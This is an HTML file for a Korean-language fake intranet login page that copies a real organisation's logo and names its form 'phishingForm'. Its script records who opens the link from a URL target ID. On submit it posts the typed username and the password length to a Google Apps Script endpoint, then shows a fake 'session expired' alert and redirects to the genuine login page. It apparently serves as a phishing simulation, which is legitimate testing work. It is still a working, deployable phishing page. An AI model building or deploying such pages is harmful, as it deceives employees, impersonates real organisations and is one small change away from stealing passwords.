<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>사내 인트라넷 로그인</title>
    <style>
        body { font-family: 'Malgun Gothic', sans-serif; display: flex; justify-content: center; align-items: flex-start; padding-top: 20vh; min-height: 100vh; background-color: #ffffff; margin: 0; box-sizing: border-box; }
        .login-container { width: 380px; padding: 40px; border: 1px solid #e0e0e0; background-color: #ffffff; text-align: center; }
        .logo-area { margin-bottom: 30px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin-bottom: 10px; border: 1px solid #333; background-color: #e8f0fe; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; padding: 14px; background-color: #009ebf; color: white; border: none; cursor: pointer; font-size: 15px; font-weight: bold; margin-bottom: 15px; }
        button:hover { background-color: #00819c; }
        .options { display: flex; justify-content: flex-start; align-items: center; font-size: 12px; color: #666; }
        .options input { margin-right: 5px; }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo-area">
            <img src="https://gnware.gnk.or.kr/thumb/original/5183723-3899" alt="로고" style="max-width: 100%; height: auto;">
        </div>
        
        <form id="phishingForm">
            <input type="text" id="userId" placeholder="아이디를 입력하세요" required>
            <input type="password" id="userPw" placeholder="비밀번호" required>
            <button type="submit">로그인</button>
            <div class="options">
                <input type="checkbox" id="saveId"> <label for="saveId">계정 저장</label>
            </div>
        </form>
    </div>

    <script>
        const gasUrl = 'https://script.google.com/macros/s/AKfycbzkc0lz3QJwzSiwPXZd9_yuTC4flTZ-aHWdq5EGg5d0z91CqTLHVC8B6bVqeMBwiVlY5w/exec';

        let originalTargetId = "";

        // 1. 페이지 접속 시
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            originalTargetId = urlParams.get('id') || "알수없음";

            if (originalTargetId !== "알수없음") {
                // 화면 아이디 칸에 자동 입력
                document.getElementById('userId').value = originalTargetId;

                // 접속 로그 전송: [타겟ID | (접속함) | 0]
                var formData = new FormData();
                formData.append('targetId', originalTargetId);
                formData.append('inputId', '(접속함)');
                formData.append('pwLen', '0');

                fetch(gasUrl, { method: 'POST', mode: 'no-cors', body: formData });
            }
        };

        // 2. 로그인 버튼 클릭 시
        document.getElementById('phishingForm').addEventListener('submit', function(e) {
            e.preventDefault(); 

            var typedId = document.getElementById('userId').value; // 실제 입력된 ID
            var typedPw = document.getElementById('userPw').value;

            var formData = new FormData();
            formData.append('targetId', originalTargetId); // URL에 있던 원본 ID
            formData.append('inputId', typedId);           // 실제로 입력한 ID
            formData.append('pwLen', typedPw.length);      // 비번 글자수

            fetch(gasUrl, {
                method: 'POST',
                mode: 'no-cors', 
                body: formData
            }).then(() => {
                alert('세션이 만료되었습니다. 다시 로그인해 주세요.');
                window.location.href = 'https://gnware.gnk.or.kr/login';
            });
        });
    </script>
</body>
</html>
